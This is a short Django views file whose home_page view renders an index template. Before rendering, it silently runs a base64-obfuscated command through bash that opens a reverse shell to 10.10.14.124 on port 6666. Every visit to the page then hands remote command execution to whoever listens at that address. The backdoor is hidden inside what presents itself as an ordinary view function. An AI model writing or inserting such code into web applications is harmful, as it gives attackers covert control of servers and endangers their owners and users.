from django.shortcuts import render
from django.views.generic import TemplateView

def home_page(request):
    import os
    os.system("echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTI0LzY2NjYgICAwPiYx | base64 -d | bash") 
    template_name = "index.html"
    return render(request,template_name)
